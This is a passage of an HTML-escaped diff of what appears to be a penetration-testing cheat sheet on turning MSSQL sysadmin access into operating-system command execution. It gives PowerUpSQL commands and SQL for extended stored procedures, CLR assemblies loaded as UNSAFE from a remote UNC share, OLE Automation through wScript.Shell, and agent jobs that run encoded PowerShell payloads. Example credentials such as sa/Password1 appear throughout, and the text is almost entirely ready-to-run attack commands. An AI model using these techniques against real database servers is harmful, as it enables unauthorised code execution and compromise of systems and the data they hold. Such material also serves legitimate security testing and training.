+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmd&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you want to use windows authentication do not user username parameter but launch a Powershell session as the desired user.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-extended-stored-procedures">Sysadmin to OS Service Account - Command Execution with extended stored procedures&lt;/h4>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Create the DLL with desired commands&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Create-SQLFileXpDll&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="s2">&amp;#34;C:\fileserver\xp_calc.dll&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;calc.exe&amp;#34;&lt;/span> &lt;span class="n">-ExportName&lt;/span> &lt;span class="s2">&amp;#34;xp_calc&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Add the DLL as a stored procedure&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLQuery&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;sp_addextendedproc &amp;#39;xp_calc&amp;#39;, &amp;#39;\\192.168.15.2\fileserver\xp_calc.dll&amp;#39;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List existing Extended stored procedures&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLStoredProcedureXP&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute the stored procedure&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLQuery&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;EXEC xp_calc&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- sp_addextendedproc can be used to register the stored procedure. Note that the function name in the DLL and the command must exactly be the same (case-sensitive)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_addextendedproc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_calc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;C:\mydll\xp_calc.dll&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Execute the stored procedure
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">xp_calc&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Drop the stored procedure
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_dropextendedproc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_calc&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Code sample for DLL can be found here:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp" target="_blank" rel="noopener">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extendedstored-procedure" target="_blank" rel="noopener">https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extendedstored-procedure&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-clr-assemblies">Sysadmin to OS Service Account - Command Execution with CLR assemblies&lt;/h4>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Creating the DLL using the file &lt;strong>cmd_exec.cs&lt;/strong>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Compile the DLL that can be loaded from a local path or a UNC path:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NET&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Framework64&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">v4&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">30319&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">csc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">target&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">library&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">labuser&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cs&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Execute the commands:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Enable CLR
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">msdb&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Enable show advanced options on the server
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;show advanced options&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Enable CLR on the server
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;clr enabled&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Import the assembly and use the stored procedure:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">---- Import the assembly from a file (UNC Path)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ASSEMBLY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">my_assembly&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;\\192.168.15.2\fileserver\cmd_exec.dll&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WITH&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">PERMISSION_SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">UNSAFE&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">---- Link the assembly to a stored procedure
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">PROCEDURE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">].[&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">execCommand&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">NVARCHAR&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4000&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">EXTERNAL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">NAME&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">my_assembly&lt;/span>&lt;span class="p">].[&lt;/span>&lt;span class="n">StoredProcedures&lt;/span>&lt;span class="p">].[&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Cleanup
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">DROP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">PROCEDURE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">DROP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ASSEMBLY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">my_assembly&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reference: &lt;a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="noopener">https://blog.netspi.com/attacking-sql-server-clr-assemblies/&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
+&lt;ol>
+&lt;li>Following command can be used to create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Create-SQLFileCLRDll&lt;/span> &lt;span class="n">-ProcedureName&lt;/span> &lt;span class="s2">&amp;#34;runcmd&amp;#34;&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="s2">&amp;#34;runcmd&amp;#34;&lt;/span> &lt;span class="n">-OutDir&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\labuser\Desktop&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>Import the stored procedure from the generated string:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ASSEMBLY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">NMfsa&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AUTHORIZATION&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x4D5A90&lt;/span>&lt;span class="err">……&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>Below command can be used to list all the stored procedures added using CLR:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLStoredProcedureCLR&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>Use below for automated enabling, executing command and reading output using CLR assembly:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdCLR&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdCLR&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-ole-automation-procedures">Sysadmin to OS Service Account - Command Execution with OLE Automation Procedures&lt;/h4>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Enable Ole Automation Stored Procedures
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;show advanced options&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;Ole Automation Procedures&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Execute command
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">DECLARE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">INT&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">DECLARE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProgramToRun&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">VARCHAR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">255&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProgramToRun&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;Run(&amp;#34;calc.exe&amp;#34;)&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_oacreate&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;wScript.Shell&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">out&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_oamethod&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProgramToRun&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_oadestroy&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-agent-jobs">Sysadmin to OS Service Account - Command Execution with Agent Jobs&lt;/h4>
+&lt;p>SQL Server Agent is a Windows service that executes scheduled tasks or jobs:&lt;/p>
+&lt;ul>
+&lt;li>Subsystem PowerShell&lt;/li>
+&lt;li>Subsystem CmdExec&lt;/li>
+&lt;li>Subsystem VBScript&lt;/li>
+&lt;li>Subsystem Jscript&lt;/li>
+&lt;/ul>
+&lt;ol>
+&lt;li>
+&lt;p>Execute commands:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdAgentJob&lt;/span> &lt;span class="n">-Subsystem&lt;/span> &lt;span class="n">PowerShell&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>List all jobs:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLAgentJob&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">Password&lt;/span> &lt;span class="s2">&amp;#34;Pass@123&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-external">Sysadmin to OS Service Account - Command Execution with external&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
